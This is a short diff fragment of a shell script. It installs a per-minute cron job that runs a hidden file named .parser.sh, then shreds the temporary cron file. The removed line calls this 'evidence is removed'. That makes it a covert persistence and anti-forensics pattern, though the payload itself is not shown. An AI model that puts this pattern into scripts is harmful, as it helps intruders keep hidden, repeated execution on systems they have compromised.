@@ -27,4 +27,4 @@ echo '* * * * * cd '$(pwd)' && ./.parser.sh' > .cron &&
 crontab .cron &&
 shred .cron
 rm .cron
-echo "[+] Cron is set and evidence is removed"
+echo "[+] Cron is set and the parser is in $(pwd)"
